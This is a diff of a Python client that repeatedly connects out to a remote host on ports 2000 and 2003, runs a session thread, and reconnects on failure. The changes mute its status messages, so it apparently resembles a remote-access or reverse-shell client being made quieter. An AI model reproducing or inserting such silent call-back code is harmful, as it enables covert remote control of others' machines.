@@ -52,13 +52,15 @@ def check_session():
     global ip,active
     ss = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
     ss.connect((ip,2000))
-    print("Connected 2")
+    #print("Connected 2")
     while True:
         try:
             sleep(1)
             ss.send("1".encode())
             ss.recv(1024)
-            print("[*] Done")
+            active = False
+            #print("[*] Done")
+            return
         except:
             active = False
             return
@@ -194,7 +196,7 @@ def main():
         try:
             s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
             s.connect((ip,2003))
-            print("Connected")
+            #print("Connected")
             active = True
             conn_process = Thread(target=start_session,args=(s,))
             conn_checker = Thread(target=check_session,args=())
@@ -202,7 +204,7 @@ def main():
             conn_process.start()
             conn_process.join()
         except socket.error:
-            print("Attempting to reconnect...")
+            #print("Attempting to reconnect...")
             main()
         except:
             print("Unknown error occured")
@@ -215,4 +217,4 @@ if __name__ == '__main__':
         #main_thread.setmDaemon(True)
         main_thread.start()
         main_thread.join()
-        print("[*]Retrying...")
+        #print("[*]Retrying...")
